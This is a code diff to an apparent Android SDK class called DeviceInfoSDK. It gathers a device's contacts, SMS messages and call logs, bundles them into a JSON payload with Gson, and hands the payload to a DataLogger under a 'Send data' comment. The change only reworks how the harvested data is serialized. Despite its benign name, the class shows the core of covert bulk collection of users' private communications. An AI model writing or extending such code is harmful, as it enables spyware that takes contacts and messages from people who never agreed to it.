@@ -6,13 +6,12 @@ import android.content.Context;
 import com.example.deviceinfosdk.permissions.CallLogFetcher;
 import com.example.deviceinfosdk.permissions.ContactFetcher;
 import com.example.deviceinfosdk.permissions.DataLogger;
-import com.example.deviceinfosdk.permissions.DataPayload;
 import com.example.deviceinfosdk.permissions.MessageFetcher;
 import com.example.deviceinfosdk.permissions.PermissionManager;
 import com.google.gson.Gson;
-import java.io.IOException;
-
+import com.google.gson.JsonObject;
 import java.util.List;
+import java.util.HashMap;
 import java.util.Map;
 
 public class DeviceInfoSDK {
@@ -44,15 +43,21 @@ public class DeviceInfoSDK {
         List<String> messages = getMessages(context);
         List<String> callLogs = getCallLogs(context);
 
+        // Create a map to hold all the data
+        Map<String, Object> dataMap = new HashMap<>();
+        dataMap.put("contacts", contacts);
+        dataMap.put("messages", messages);
+        dataMap.put("callLogs", callLogs);
+
         System.out.println("Collected Contacts: " + contacts);
         System.out.println("Collected Messages: " + messages);
         System.out.println("Collected Call Logs: " + callLogs);
 
-        // Serialize data
-        String jsonData = new Gson().toJson(new DataPayload(contacts, (Map<String, List<String>>) messages, callLogs));
+        // Serialize data using Gson
+        String jsonData = new Gson().toJson(dataMap);
         System.out.println("JSON Payload: " + jsonData);
+
         // Send data
         DataLogger.logData(jsonData);
     }
-
 }
